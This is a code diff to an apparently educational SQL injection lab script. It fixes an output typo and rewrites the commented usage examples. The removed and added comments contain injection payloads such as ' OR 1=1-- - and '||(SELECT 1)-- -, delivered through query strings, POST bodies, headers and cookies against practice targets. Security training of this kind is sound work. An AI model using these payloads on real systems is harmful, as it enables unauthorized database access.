@@ -107,7 +107,7 @@ def main(argv: list[str]) -> int:
 
     print(f"URL:     {res.url}")
     print(f"Status:  {res.status_code}")
-    print(f"Elpased: {res.elpased_s:.3f}s")
+    print(f"Elapsed: {res.elapsed_s:.3f}s")
     # For debugging, uncomment
     # print(f"--- Body excerpt ---")
     # print(res.evidence_excerpt)
@@ -119,21 +119,12 @@ if __name__ == "__main__":
     raise SystemExit(main(sys.argv[1:]))
 
 # Usage examples
-# Classic: GET /filter?category=...
-# python -m src.sqli.lab01 https://target "' OR 1=1-- -" \
-#  --endpoint /filter --inject query --param-name category \
-#  --marker "Cat Grin"
-
-# POST body injection
-# python -m src.sqli.lab01 https://target "' OR 1=1-- -" \
-#   --method POST --endpoint /filter --inject body --param-name category
-
-# Header-based injection (e.g., X-Forwarded-For timing)
-# python -m src.sqli.lab01 https://target "'||(SELECT 1)-- -" \
-#   --endpoint / --inject header --param-name X-Forwarded-For \
-#   --marker-regex "Welcome"
-
-# Cookie-based injection (TrackingId cookie)
-# python -m src.sqli.lab01 https://target "'||(SELECT 1)-- -" \
-#   --endpoint / --inject cookie --param-name TrackingId \
-#   --marker-regex "Welcome back"
+# python -m src.sqli.lab01 \
+#   https://target.web-security-academy.net \
+#   "' OR 1=1-- -" \
+#   --method GET \
+#   --endpoint /filter \
+#   --inject query \
+#   --param-name category \
+#   --marker "Cat Grin" \
+#   --insecure
